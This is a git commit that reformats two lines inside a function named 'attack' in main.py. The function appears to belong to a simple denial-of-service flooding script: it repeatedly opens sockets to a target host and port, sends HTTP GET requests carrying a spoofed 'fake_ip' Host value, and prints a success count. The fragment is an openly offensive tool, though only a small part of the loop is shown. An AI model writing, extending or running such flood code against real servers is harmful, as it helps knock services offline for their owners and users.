795187a1e7f9135ad7f00de4ef10ed100700d2f4
Lucas <lucas.bateson@gmail.com>
2022-02-28 10:25:57 +0100

    Fix Formatting

--- main.py
+++ main.py
@@ -12,10 +12,8 @@ def attack(count):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((target, port))
-            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'),
-                     (target, port))
-            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),
-                     (target, port))
+            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'),(target, port))
+            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target, port))
             s.close()
             print("Successfull: " + count)
         except ConnectionRefusedError:
